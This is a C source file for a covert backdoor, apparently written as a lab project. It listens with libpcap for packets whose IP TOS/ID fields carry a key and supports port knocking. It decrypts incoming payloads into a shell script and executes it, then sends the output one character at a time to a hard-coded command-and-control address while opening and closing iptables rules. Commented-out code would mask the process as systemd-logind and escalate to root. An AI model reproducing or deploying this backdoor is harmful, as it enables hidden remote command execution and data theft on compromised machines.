#include "main.h"

#define FILTER "tcp and (port 8506 || port 8507)"
#define PAYLOAD_KEY "8505"
#define PORT "8505"
#define SHPORT 8505
#define SPORT 22
#define BUFFERSIZE 1024
#define MASK "/usr/lib/systemd/systemd-logind"
#define CMD "./cmd.sh > results"
#define CHMOD "chmod 755 cmd.sh"
#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
#define RESULT_FILE "results"
#define INFECTEDIP "192.168.0.100"
#define CNCIP "192.168.0.109"

struct payload{
    char key[5]; // always 8505
    char buffer[1024]; // for either commands or results
};


int Packetcapture();
void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool knock);
void ParsePayload(const u_char *payload, int len);
void CreatePayload(char *command, unsigned char *encrypted);
void SendPayload(const unsigned char *tcp_payload);
bool CheckKey(u_char ip_tos, u_short ip_id);
void recv_results(char* sip, unsigned short sport);
void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename);
int rand_delay(int delay);


int knocking[2];
int pattern[2];

int main(int argc, char **argv){
    //strcpy(argv[0], MASK);
    //change the UID/GID to 0 to raise privs
    //setuid(0);
    //setgid(0);
    char *c = "c";
    char *sip = CNCIP;
    char *dip = INFECTEDIP;
    unsigned short sport = SHPORT;
    unsigned short dport = SHPORT;
    unsigned char data[BUFSIZE] = "ls";
    pattern[0] = 14881;
    pattern[1] = 15137;
    knocking[0] = 0;
    knocking[1] = 0;


    if(strcmp(argv[1],c) == 0){
        covert_send(sip, dip, sport, dport, data, 0);
        Packetcapture();
        exit(1);
    } else {
        Packetcapture();
    }

    return 0;
}

int Packetcapture(){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    pcap_t* interfaceinfo;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }

    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    pcap_loop(interfaceinfo, -1, ReadPacket, NULL);
    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);

    if(type == ETHERTYPE_IP){
        ParseIP(args, pkthdr, packet);
    }
}
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if(length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        if(CheckKey(ip->ip_tos, ip->ip_id)){
            printf("Reading payload\n");
            ParseTCP(args, pkthdr, packet, false);
        } else if(ip->ip_tos == 'b' && ip->ip_id == 'l') {
            ParseTCP(args,pkthdr, packet, true);
        } else {
            printf("Packet tossed wrong key\n");
        }
    }

}

bool CheckKey(u_char ip_tos, u_short ip_id){
    if(ip_tos == 'l' && ip_id == 'b'){
        return true;
    } else {
        return false;
    }
}

void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool knock){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
    if(knock){
        for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
            if(pattern[k] == tcp->th_dport){
                knocking[k] = 1;
            }
        }
    if((knocking[0] == 1) && (knocking[1] == 1)){
        system(IPTABLES);
        char *dip = INFECTEDIP;
        unsigned short sport = SHPORT;
        unsigned short dport = SHPORT;
        printf("WAITING FOR DATA\n");
        recv_results(dip, dport);
        system(TURNOFF);
    }
    } else {
        if(size_payload > 0){
            printf("Payload (%d bytes):\n", size_payload);
            ParsePayload(payload, size_payload);
        }
    }
}

void ParsePayload(const u_char *payload, int len){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen("cmd.sh", "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
//    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
    cipherlen = strlen((char*)payload);
//    printf("Encrypted Payload is: %s \n", payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    printf("Decrypted payload size: %d\n", decryptedlen);
    printf("Decrypted Payload is: %s \n", decryptedtext);
    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    fclose(fp);
    system(CHMOD);
    system(CMD);
    system(IPTABLES);


    //sending the results back to the CNC
    char *srcip = INFECTEDIP;
    char *destip = CNCIP;
    unsigned short sport = SHPORT;
    unsigned short dport = SHPORT;

    send_results(srcip, destip, sport, dport, RESULT_FILE);
    system(TURNOFF);
}

void recv_results(char* sip, unsigned short sport) {
    FILE* file;
    char input;

    printf("listening for results\n\n");

    if((file = fopen(RESULT_FILE, "wb")) == NULL) {
        perror("fopen can't open file");
        exit(1);
    }

    while(1) {
        input = covert_recv(sip, sport, 1, 0, 0, 0);
        if(input != 0) {
            printf("Output: %c\n", input);
            fprintf(file, "%c", input);
            fflush(file);
        } else if (input == EOF){
            return;
        }
    }
}

void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename) {
    FILE *file;
    char input;
    clock_t start;
    int timer_complete =0, delay  = 0;
    int max_delay = 1;
    double passed;

    if((file = fopen(filename, "rb")) == NULL) {
        perror("fopen can't open file");
        exit(1);
    }

    while((input = fgetc(file)) != EOF) {
        printf("Character to send: %d\n", input);
        covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
        start = clock();    //start of clock
        timer_complete = 0;    //reset the timer again
        delay = rand_delay(max_delay);
        printf("delay: %d\n", delay);

        //wait for the timer to complete
        while(timer_complete == 0) {
            passed = (clock() - start) / CLOCKS_PER_SEC;
            if(passed >= delay) {
                printf("Delay completed\n");
                timer_complete = 1;
            }
        }
    }

    printf("completed\n");
    fclose(file);
}


int rand_delay(int delay) {
    return rand() % delay + 1;
}
